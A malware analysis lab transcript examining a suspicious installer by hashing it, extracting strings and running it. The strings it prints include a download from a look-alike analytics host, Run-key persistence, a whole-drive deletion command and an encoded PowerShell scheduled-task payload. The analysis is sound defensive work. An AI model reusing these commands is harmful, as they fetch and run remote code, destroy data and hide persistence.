# Scenario
Courtesy of a limited threat intelligence report, it was revealed that the malware analytics.exe was installed by a tool called analyticsinstaller.exe. Copies of both specimens are included with the report. The CEO of Falsimentis has asked you not to upload the specimens to any online sites. You will need to perform this analysis without the aid of external analysis sites.
Since the file analyticsinstaller.exe is new to the scenario, the system administrator asked you to analyze this file.
```
PS C:\tools\falsimentis> ls


    Directory: C:\tools\falsimentis


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/20/2020   8:39 PM        9191161 analytics.exe
-a----         4/20/2020   8:38 PM          13824 AnalyticsInstaller.exe
-a----         12/4/2023   6:39 PM              0 dir


PS C:\tools\falsimentis>  Get-FileHash -Algorithm MD5 AnalyticsInstaller.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             5524BDF546472FD66D3450C39CC4E2E5                                       C:\tools\falsimentis\AnalyticsI...


PS C:\tools\falsimentis>  Get-FileHash -Algorithm SHA256 AnalyticsInstaller.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          D501EF28D4C3F3C308461E5FB51929E3875395C38E6A885692C8788A3C376E45       C:\tools\falsimentis\AnalyticsI...


PS C:\tools\falsimentis> C:\tools\sysinternals\strings.exe -n 10 .\AnalyticsInstaller.exe

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run in DOS mode.
@http://www1-google-analytics.com:8088/analytics.exe
C:\Windows\System32\analytics.exe
Software\Microsoft\Windows\CurrentVersion\Run
Analytics Client
RegOpenKeyEx error!
C:\Windows\System32\AnalyticsBackup.bat
cmd.exe /c rd c:\ /s /q
powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABtAG0AawAxACAAPQAgACIATgBUACAAQQBVAFQASABPAFIASQBUAFkAXABTAFkAUwBUAEUATQAiAAoAJABtAG0AawAyACAAPQAgACIAQQBuAGEAbAB5AHQAaQBjAHMAIABCAGEAYwBrAHUAcAAiAAoAJABtAG0AawAzACAAPQAgACIAQQBuAGEAbAB5AHQAaQBjAHMAIABCAGEAYwBrAHUAcAAgAFMAZQByAHYAaQBjAGUAIgAKACQAbQBtAGsANAAgAD0AIABbAEQAYQB0AGUAVABpAG0AZQBdADoAOgBOAG8AdwAuAEEAZABkAEQAYQB5AHMAKAAxACkALgBUAG8AUwB0AHIAaQBuAGcAKAAiAEYAIgApAAoAJABtAG0AawA1ACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBUAHIAaQBnAGcAZQByACAALQBPAG4AYwBlACAALQBBAHQAIAAkAG0AbQBrADQACgAkAG0AbQBrADYAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAEEAYwB0AGkAbwBuACAALQBFAHgAZQBjAHUAdABlACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYQBuAGEAbAB5AHQAaQBjAHMAYgBhAGMAawB1AHAALgBiAGEAdAAiAAoAJABtAG0AawA3ACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGUAdAB0AGkAbgBnAHMAUwBlAHQAIAAtAFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlACAALQBIAGkAZABkAGUAbgAgAC0ARABvAG4AdABTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAALQBXAGEAawBlAFQAbwBSAHUAbgAgAC0AQQBsAGwAbwB3AFMAdABhAHIAdABJAGYATwBuAEIAYQB0AHQAZQByAGkAZQBzAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgBBAG4AYQBsAHkAdABpAGMAcwAgAEIAYQBjAGsAdQBwACIAIAAtAFQAcgBpAGcAZwBlAHIAIAAkAG0AbQBrADUAIAAtAFUAcwBlAHIAIAAkAG0AbQBrADEAIAAtAEEAYwB0AGkAbwBuACAAJABtAG0AawA2ACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAkAG0AbQBrADMAIAAtAFMAZQB0AHQAaQBuAGcAcwAgACQAbQBtAGsANwAKAA==
cmd.exe /c start /max http://www.midnitemeerkats.com/note
File Saver
.rdata$sxdata
.rdata$zzzdbg
CreateFileW
CloseHandle
KERNEL32.dll
RegOpenKeyExW
RegSetValueExW
RegCloseKey
ADVAPI32.dll
?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A
?uncaught_exception@std@@YA_NXZ
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAE_JPBD_J@Z
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z
?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
MSVCP140.dll
URLDownloadToFileW
urlmon.dll
DeleteUrlCacheEntryW
WININET.dll
__CxxFrameHandler3
__std_terminate
__current_exception
__current_exception_context
_except_handler4_common
VCRUNTIME140.dll
_seh_filter_exe
_set_app_type
__setusermatherr
_configure_narrow_argv
_initialize_narrow_environment
_get_initial_narrow_environment
_initterm_e
_set_fmode
__p___argc
__p___argv
_register_thread_local_exe_atexit_callback
_configthreadlocale
_set_new_mode
__p__commode
_initialize_onexit_table
_register_onexit_function
_crt_atexit
_controlfp_s
api-ms-win-crt-runtime-l1-1-0.dll
api-ms-win-crt-math-l1-1-0.dll
api-ms-win-crt-stdio-l1-1-0.dll
api-ms-win-crt-locale-l1-1-0.dll
api-ms-win-crt-heap-l1-1-0.dll
UnhandledExceptionFilter
SetUnhandledExceptionFilter
GetCurrentProcess
TerminateProcess
IsProcessorFeaturePresent
QueryPerformanceCounter
GetCurrentProcessId
GetCurrentThreadId
GetSystemTimeAsFileTime
InitializeSListHead
IsDebuggerPresent
GetModuleHandleW
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
0)0.0@0T0`0m0w0
1$1)161U1a1h1
2!2.2:2H2f2}2
5&565C5W5c5
7)7.7;7u7N8W8b8i8
9$949D9T9]9
:B:Q:h:n:t:z:
1&1H1O1^1h1n1t1z1
 1(14181P1T1
= =4=D=P=p=
PS C:\tools\falsimentis> c:\tools\regshot\regshot_x64.exe
PS C:\tools\falsimentis> .\AnalyticsInstaller.exe

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              Analytics Backup                  Ready


PS C:\tools\falsimentis>
```
